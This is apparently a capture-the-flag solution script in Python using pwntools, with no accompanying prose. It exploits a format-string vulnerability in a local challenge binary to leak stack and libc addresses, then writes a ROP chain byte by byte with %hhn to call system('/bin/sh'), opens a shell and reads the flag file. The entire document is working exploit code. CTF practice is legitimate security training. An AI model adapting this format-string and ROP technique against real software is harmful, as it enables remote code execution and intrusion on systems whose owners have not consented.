#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './chall')
libc = ELF(exe.libc.path)

def send(arguments, fmt):
    io.sendlineafter(b"# of args: ", str(len(arguments)).encode())
    for i in range(len(arguments)): io.sendlineafter(f"[{i}]: ".encode(), str(arguments[i]).encode())
    io.sendlineafter(b"string: ", fmt)

while True:
    try:
        io = process()

        send([0], f"%*7$".encode())
        leak = io.recvline().decode().strip()[1:]
        if '-' in leak: leak = int(leak) & 0xFFFFFFFF
        else: leak = int(leak)
        stack_leak = (0x7fff << 32) | leak
        rip = stack_leak + 0x170
        send([rip], b'%s')
        libc.address = u64(io.recvline().strip().ljust(8, b'\x00')) - 0x2a1ca ; break
    except: continue

rop  = b''
rop += p64(libc.address + 0x10f78b)
rop += p64(next(libc.search(b"/bin/sh\x00")))
rop += p64(libc.address + 0x2882f)
rop += p64(libc.sym.system)


for i in range(len(rop)//8): 
    target = u64(rop[(i*8):((i+1)*8)])
    for j in range(6):
        send([((target >> (j*8)) & 0xff)-1, 0, rip+(i*8)+j], b"%*x %hhn")

io.sendline(b"-") ; io.clean()
io.sendline(b"cat ../flag-*.txt")
io.interactive()

